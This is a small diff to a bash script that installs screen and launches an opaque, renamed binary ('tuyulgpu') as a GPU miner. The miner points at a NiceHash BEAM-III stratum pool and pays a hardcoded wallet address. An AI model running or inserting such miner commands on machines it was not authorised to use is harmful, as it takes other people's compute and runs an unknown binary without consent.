@@ -1,4 +1,6 @@
+#!/bin/bash
+
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
-sudo apt-get update
-sudo apt install screen -y
-sudo ./2 --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
+apt-get update
+apt install screen -y
+chmod u+x tuyulgpu && ./tuyulgpu --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
